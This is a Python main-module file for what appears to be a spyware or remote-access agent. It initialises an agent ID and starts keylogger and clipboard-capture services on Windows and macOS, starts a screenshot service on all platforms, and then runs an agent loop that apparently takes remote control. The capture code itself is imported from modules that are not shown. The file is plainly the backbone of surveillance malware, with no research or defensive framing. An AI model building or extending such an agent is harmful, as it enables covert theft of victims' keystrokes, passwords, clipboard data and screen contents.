import platform

from app.bootstrap import init_agent
from app.agent import Agent
from services.keylogger import start_keylogger_service
from services.clipboard import start_clipboard_service
from services.screenshot import start_screenshot_service

def main():
    agent_id = init_agent()
    SYSTEM = platform.system()

    # background services
    if SYSTEM in ["Windows", "Darwin"]:
        start_keylogger_service(agent_id)
        start_clipboard_service(agent_id)

    start_screenshot_service(agent_id)

    # main loop
    agent = Agent(agent_id)
    agent.run()


if __name__ == "__main__":
    main()